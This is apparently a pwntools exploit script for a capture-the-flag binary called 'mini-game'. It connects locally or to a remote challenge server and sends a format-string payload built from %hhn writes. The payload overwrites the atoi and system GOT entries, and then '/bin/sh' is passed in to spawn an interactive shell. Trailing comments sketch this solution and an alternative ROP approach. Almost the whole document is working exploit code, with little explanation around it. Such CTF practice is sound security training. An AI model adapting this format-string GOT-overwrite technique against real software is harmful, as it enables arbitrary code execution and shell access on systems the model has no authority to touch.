from pwn import *

local = True

if local:
	r = process("./mini-game")
else:
	# nc 103.237.99.35 28993	
	r = remote("103.237.99.35", 28993)

atoi_got = 0x602078
sys_got = 0x602030
sys = 0x4007b0 + 6
main = 0x400b56

payload = "%17$hhn" + "%18$hhn" + "%19$hhn"
payload +=  "%182x" + "%14$hhn" + "%81x" + "%15$hhn" + "%313x" + "%16$hhn"
payload += "%278x" + "%20$hhn" + "%181x" + "%21$hhn" 

#print hex(len(payload))

payload += p64(atoi_got) + p64(atoi_got+1) + p64(atoi_got+2) + p64(atoi_got+3)
payload += p64(atoi_got+4) + p64(atoi_got+5) + p64(sys_got) + p64(sys_got+1)

print r.recv()
r.send("a"*0x10)

print r.recv()
r.send("2" + "a"*15)

print r.recv()
r.sendline("Y")

#gdb.attach(r)

print r.recv()
r.send(payload)

print r.recv()
r.send("n"*0x10)

print r.recv()

#print r.recv()
r.send("/bin/sh\x00")

r.interactive()



'''
gdb-peda$ pdis 0x4007b0
Dump of assembler code from 0x4007b0 to 0x4007d0::	Dump of assembler code from 0x4007b0 to 0x4007d0:
   0x00000000004007b0 <system@plt+0>:	jmp    QWORD PTR [rip+0x20187a]        # 0x602030
   0x00000000004007b6 <system@plt+6>:	push   0x3
   0x00000000004007bb <system@plt+11>:	jmp    0x400770
   0x00000000004007c0 <printf@plt+0>:	jmp    QWORD PTR [rip+0x201872]        # 0x602038
   0x00000000004007c6 <printf@plt+6>:	push   0x4
   0x00000000004007cb <printf@plt+11>:	jmp    0x400770
End of assembler dump.
gdb-peda$ vmmap

--> plt+0 will jump into got
    plt+6 will run dl_runtime

--> so if we change in got of system by main, we still have a chance to call system 
'''

'''
solution2:
- change sys_got by pop_pop_pop..._ret because our input lay in rsp, 
so we can use ROP tech

------>>>>>>>>> ROP in rsp

'''

'''
Solution1:
- change sys_got to main and change atoi_got to sys_plt+6

'''
